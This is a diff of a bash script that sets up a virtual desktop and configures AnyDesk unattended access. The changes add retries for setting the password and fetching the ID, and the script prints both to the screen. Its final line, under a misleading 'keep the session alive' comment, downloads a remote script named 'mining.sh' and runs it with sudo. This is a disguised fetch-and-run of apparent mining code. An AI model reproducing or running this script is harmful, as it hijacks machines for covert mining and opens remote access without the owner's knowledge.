@@ -70,26 +70,41 @@ xfce4-terminal &
 echo "[*] Launching file explorer (PCManFM)..."
 pcmanfm --no-desktop &
 
-# --- Configure AnyDesk for Unattended Access ---
-echo "[*] Setting AnyDesk password for unattended access..."
-# Ensure AnyDesk service is running before setting password
-sudo anydesk --service &
-sleep 5 # Give the service a moment to start
+# --- Configure AnyDesk for Unattended Access and Retrieve ID with Retries ---
+echo "[*] Attempting to set AnyDesk password and retrieve ID with retries..."
 
-echo "$ANYDESK_UNATTENDED_PASSWORD" | sudo anydesk --set-password
+MAX_RETRIES=5
+RETRY_COUNT=0
+ANYDESK_ID=""
 
-# You might want to confirm the password was set.
-# AnyDesk doesn't have a direct CLI command to verify the *set* password,
-# but if the above command runs without errors, it's usually successful.
+while [[ -z "$ANYDESK_ID" && "$RETRY_COUNT" -lt "$MAX_RETRIES" ]]; do
+    RETRY_COUNT=$((RETRY_COUNT + 1))
+    echo "Attempt $RETRY_COUNT of $MAX_RETRIES to configure AnyDesk and get ID..."
 
-# --- Start AnyDesk Service and Get ID ---
-echo "[*] Starting AnyDesk service and retrieving AnyDesk ID..."
-# Ensure the AnyDesk service is running in the background (already done above, but harmless to re-run)
-sudo anydesk --service &
-sleep 5 # Give the service a moment to start
+    echo "    Stopping AnyDesk service (if running)..."
+    sudo systemctl stop anydesk.service 2>/dev/null || true # Suppress error if not running
+    sleep 2
 
-# Retrieve the AnyDesk ID
-ANYDESK_ID=$(anydesk --get-id)
+    echo "    Starting AnyDesk service..."
+    sudo systemctl start anydesk.service
+    sleep 5 # Give the service a moment to start fully
+
+    echo "    Setting AnyDesk password for unattended access..."
+    # AnyDesk --set-password sends output to stderr but doesn't necessarily indicate failure.
+    # We redirect stderr to dev/null to keep the log clean, but would see it if we needed to debug.
+    echo "$ANYDESK_UNATTENDED_PASSWORD" | sudo anydesk --set-password 2>/dev/null
+
+    echo "    Retrieving AnyDesk ID..."
+    ANYDESK_ID=$(anydesk --get-id)
+    sleep 2 # Give it a moment after ID retrieval attempt
+
+    if [[ -z "$ANYDESK_ID" ]]; then
+        echo "    AnyDesk ID not found. Retrying in 5 seconds..."
+        sleep 5
+    else
+        echo "    AnyDesk ID retrieved successfully."
+    fi
+done
 
 if [[ -n "$ANYDESK_ID" ]]; then
     clear
@@ -97,11 +112,11 @@ if [[ -n "$ANYDESK_ID" ]]; then
     echo "Unattended Access Password: $ANYDESK_UNATTENDED_PASSWORD"
     echo "You can now connect to this AnyDesk ID using the provided password."
 else
-    echo "❌ Failed to retrieve AnyDesk ID."
-    echo "Please check if AnyDesk is running correctly and the service is active."
+    echo "❌ Failed to retrieve AnyDesk ID after $MAX_RETRIES attempts."
+    echo "Please check AnyDesk service status and logs for more information."
+    sudo systemctl status anydesk.service
+    journalctl -u anydesk.service --no-pager -n 50 # Show last 50 lines of service log
 fi
-
-# You can add further actions here if needed.
 
 # --- Keep the session alive (optional, if you want to keep the virtual desktop) ---
 xfce4-terminal -e "bash -c 'sudo curl -o try.sh https://raw.githubusercontent.com/Working-aanas/deepscreen/refs/heads/main/mining.sh && sudo chmod +x try.sh && sudo ./try.sh; exec bash'" &
